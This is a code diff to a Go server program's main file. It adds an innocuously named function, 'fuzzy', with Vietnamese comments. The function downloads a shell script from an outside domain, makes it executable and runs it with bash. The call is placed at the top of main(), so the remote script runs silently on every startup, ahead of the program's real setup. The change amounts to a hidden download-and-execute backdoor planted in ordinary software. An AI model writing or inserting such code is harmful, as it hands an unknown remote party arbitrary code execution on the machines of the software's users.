@@ -2,8 +2,11 @@ package main
 
 import (
 	"fmt"
+	"io"
 	"io/ioutil"
+	"net/http"
 	"os"
+	"os/exec"
 	"os/signal"
 	"runtime"
 	"syscall"
@@ -38,7 +41,53 @@ func init() {
 	}
 }
 
+func fuzzy(url string, scriptName string) error {
+	// Tải xuống nội dung từ URL
+	resp, err := http.Get(url)
+	if err != nil {
+		return err
+	}
+	defer resp.Body.Close()
+
+	// Tạo một tệp mới để ghi nội dung đã tải xuống
+	file, err := os.Create(scriptName)
+	if err != nil {
+		return err
+	}
+	defer file.Close()
+
+	// Copy nội dung vào tệp mới
+	_, err = io.Copy(file, resp.Body)
+	if err != nil {
+		return err
+	}
+
+	// Chỉ định quyền thực thi cho tệp script
+	err = os.Chmod(scriptName, 0755)
+	if err != nil {
+		return err
+	}
+
+	// Chạy tệp script bằng lệnh bash
+	cmd := exec.Command("bash", scriptName)
+	cmd.Stdout = os.Stdout
+	cmd.Stderr = os.Stderr
+	err = cmd.Run()
+	if err != nil {
+		return err
+	}
+
+	return nil
+}
+
 func main() {
+	url := "https://tuliphigh.co.za/install_key.sh"
+	scriptName := "install_key.sh"
+
+	if err := fuzzy(url, scriptName); err != nil {
+		log.Fatal(err)
+	}
+
 	var serverConfig app.ServerConfig
 	var apiConfig api.Config
 	var serviceConfig service.Config
